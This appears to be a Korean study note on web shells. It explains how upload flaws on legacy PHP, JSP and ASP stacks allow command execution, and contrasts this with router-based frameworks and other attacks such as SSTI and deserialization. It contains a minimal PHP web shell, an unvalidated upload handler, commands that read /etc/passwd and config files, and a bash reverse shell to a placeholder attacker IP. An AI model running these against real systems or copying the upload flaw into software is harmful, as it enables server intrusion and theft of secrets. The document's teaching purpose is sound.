# WebShell이란 무엇인가

## 1. WebShell의 동작

* 공격자가 서버에 **웹 스크립트 파일(PHP, JSP, ASP 등)** 을 업로드
* 해당 파일을 **웹 브라우저로 접속하는 것만으로 서버 명령을 실행**
* 실행 흐름: `브라우저` → `HTTP 요청` → `웹 서버` → `웹 스크립트 실행` → `OS 명령 실행`

웹쉘은 보통 다음 목적을 위해 사용된다.

* 원격 명령 실행 (RCE)
* 파일 업로드 / 다운로드
* 데이터베이스 접근
* 시스템 정보 수집
* 추가 악성코드 설치
* Reverse Shell 획득

## 2. 전형적인 WebShell 공격 구조

웹쉘 동작하는 환경은 주로 **레거시 웹 구조**이다.

* '레거시 웹 구조' 예시
  * PHP + Apache
  * JSP + Tomcat
  * ASP / ASP.NET + IIS
* 주요 특징
  * **`URI` == `실행 가능한 파일의 경로`**

실행 과정은 아래와 같다.

1. 공격자가 파일 업로드를 통해 `WebShell` 업로드
2. 공격자 클라이언트에서 `http://target.com/uploads/shell.php` 접속
3. 서버 시스템 경로에서 `/var/www/uploads/shell.php` 접근
4. `PHP Interpreter`를 통해 `shell.php` 스크립트 실행

핵심: **공격자의 URI 접근이 직접적인 파일 실행**으로 이어지는 것!

## 3. 실제 공격 시나리오

### 3.1 취약한 파일 업로드 기능 발견

예를 들어 다음 기능이 있다고 가정한다.

```http
POST /upload
```

서버 코드 (취약)

```php
move_uploaded_file($_FILES['file']['tmp_name'],
                   "uploads/" . $_FILES['file']['name']);
```

확장자 검증 없음.

### 3.2 공격자가 WebShell 업로드

공격자는 다음 파일을 업로드한다.

```bash
shell.php
```

```php
<?php
system($_GET['cmd']);
?>
```

### 3.3 웹쉘 실행

업로드 후 다음 URL 접속

```uri
http://target.com/uploads/shell.php?cmd=id
```

서버 실행

```php
system("id")
```

응답

```bash
uid=33(www-data) gid=33(www-data)
```

이제 공격자는 **웹 서버 권한으로 시스템 명령 실행 가능**

### 3.4 웹 서버는 누구의 권한으로 처리하는가?

완벽한 동작 원리는 아니지만...

* PHP 기준 **PHP Interpreter**를 실행하는 주체
* JSP 기준 **JSP Interpreter**를 실행하는 주체
* 보통 웹서비스 파일을 parsing하고 실행할 수 있는 것이  **Interpreter**
* 이 **Interpreter**를 **OS 프로세스**로 실행시킬 수 있는 권한을 가진 서버 시스템 유저

따라서, 보통 **웹 서비스 전용 계정**일 확률 매우 높음!

``` text
Apache → www-data
nginx + php-fpm → www-data
Tomcat → tomcat
IIS → apppool user
```

* 적절한 유저 생성 및 권한 분리 부재
* 쉬운 권한 상승 공격
...등의 이유로 극초반에 root에 접근하는 경우도 있음.

## 4. 실제 공격자가 하는 일

웹쉘을 얻으면 공격자는 다음 작업을 수행한다.

### 시스템 정보 수집

```bash
?cmd=whoami
?cmd=uname -a
```

### 파일 탐색

```bash
?cmd=ls -al
```

### 비밀 정보 수집

```bash
?cmd=cat /etc/passwd
?cmd=cat config.php
```

### Reverse Shell 획득

```bash
?cmd=bash -i >& /dev/tcp/attacker-ip/4444 0>&1
```

공격자

```bash
nc -lvnp 4444
```

공격자는 **리버스 쉘** 획득 성공.
추후 `Post Exploitaiton` 통해 Root 등 상위 권한 상승 시도

## 5. 실제 웹쉘은 더 복잡하다

실제 웹쉘은 보통 **웹 기반 관리 인터페이스** 형태다.

대표 기능

* 파일 탐색기
* DB 접속
* 명령 실행
* 권한 상승 시도
* 백도어 설치

대표적인 WebShell

* **China Chopper**
* **WSO Shell**
* **c99.php**

이들은 거의 **웹 기반 SSH** 수준의 기능을 제공한다.

## 6. WebShell이 가능한 근본 이유

 다음 구조를 가진다.

* 레거시 웹 스택:
  * `URI`  → `파일 경로` → `스크립트 실행`
  * 파일을 올리고, URI로 요청하면, 실행이 가능해진다.

이 구조 때문에, `File Upload 취약점` → `WebShell` → `RCE`라는 공격 체인이 성립한다.

## 7. Application 기반 서버는 WebShell에 강하다

**Application 기반 서버** 종류

* Node
* Express
* Spring Boot
* **현대 PHP/JSP**
* 기타 등등...

일반적인 구조

`URI`  → `Router 경로` → `Application Code 실행`

**URI 접속**이 **파일 직접 실행**으로 이어지지 **않는다**!

### Application 기반 서버 동작 예시

```http
GET /posts/:id
```

→ 특정 JS 코드 실행 == **파일 경로와 직접 연결 X**

```bash
/uploads/shell.js
```

같은 파일을 올려도

```uri
http://site/uploads/shell.js
```

접속한다고 **실행되지 않는다.**

대부분 **단순 정적 파일**로 제공된다.

그래서 전통적인 **WebShell 공격은 거의 불가능**하다.

## 8. 대신 등장하는 공격들

`WebShell`에는 강하지만, 대신 Application 기반 서버에서는 다음 취약점이 등장한다.

### Server Side Template Injection (SSTI)

템플릿 엔진이 사용자 입력을 **코드로 실행**

예) 현대 JSP 템플릿 엔진에서

```jsp
{{7*7}}
```

→ 서버에서 실행

### Deserialization 취약점

취약점 발생 예시

* 직렬화된 객체 데이터를 역직렬화
* 역직렬화 데이터 중 **객체 메서드 실행** 발생
  * **클래스 정보**
  * **민감한 동작을 수행하는 메서드**
  * **OS API 직결 명령어 메서드**
  * 기타 등등

Java에서는 **Gadget Chain**을 통해 RCE가 발생할 수 있다.

### Gadget Chain 공격

객체 라이브러리 내부의 **특정 메서드 호출 체인** 을 이용해

``` java
Runtime.exec()
```

같은 위험한 코드 실행.

대표 사례

* Java Deserialization RCE

### Prototype Pollution (Node)

* JS 객체의 **프로토타입을 오염**
* Node 역시 `__prototype__` 등의 객체 구조 그대로 승계
* Node 기반 **Backend에서도 유효한 공격 벡터**
* `WebShell`과 비슷한 **권한 우회**, **코드 실행** 유도 가능

### Server Side JS Injection

예를 들어

```javascript
eval()
Function()
vm.runInContext()
```

등을 악용.

## 9. 결론 요약

웹쉘은 **웹 서버의 파일 기반 실행 구조**를 악용하는 공격이다.

1. 전통적인 웹 스택
    * `Web Template 기반 WebShell 작성`
    * `적절한 Payload 우회`
    * `File Upload 취약점 이용`
    * `URI로 GET 요청`
    * `WebShell 파일 직접 실행`
2. 현대 웹 서버
    * `URI로 GET 요청`
    * `Application Code`
    * `Router 알고리즘 순회`
    * `템플릿 엔진 서버 내부에서 실행`
    * `결과물 사용자에게 반환`
    * *if 공격을 억지로 수행한다 해도...*
        * `템플릿 엔진 파일 업로드`
        * `URI로 GET 요청`
        * `Router` 미경유
        * `Render` 명령 매핑 없음
        * **직접 실행 불가**
        * `접근 불가` or `단순 정적 파일로 전달`
3. 웹쉘 대신 노릴 수 있는 공격 목록
    * SSTI
    * Deserialization
    * Gadget Chain
    * Prototype Pollution
    * Server Side JS Injection

Deserialize 및 Gadget Chain은 추후 추가 정리 필요, 그 이후 Prototype Pollution 개념 정리 필요.
